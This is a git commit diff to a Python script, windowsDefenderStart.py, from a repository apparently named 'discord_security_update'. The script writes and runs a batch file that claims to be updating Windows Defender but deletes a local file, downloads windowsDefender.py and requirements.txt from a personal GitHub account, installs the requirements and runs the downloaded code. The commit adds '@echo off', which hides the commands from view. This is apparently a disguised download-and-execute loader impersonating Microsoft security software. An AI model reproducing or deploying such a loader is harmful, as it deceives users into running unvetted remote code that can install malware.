255dd0dec1c2cb0311f72930033101d968ec2907
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 20:46:46 +0200

    Update windowsDefenderStart.py

--- windowsDefenderStart.py
+++ windowsDefenderStart.py
@@ -1,18 +1,19 @@
 import os
   
 open("update.bat", "w+").write("""
-    echo updating windows defender
+@echo off
+echo updating windows defender
 
-    timeout /t 10 /nobreak
-    del windowsDefender.py
+timeout /t 10 /nobreak
+del windowsDefender.py
     
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
     
-    pip install -r requirements.txt
+pip install -r requirements.txt
     
-    echo windows defender is up to date
-    python windowsDefender.py                         
+echo windows defender is up to date
+python windowsDefender.py                         
 """)
 
 os.system("update.bat")
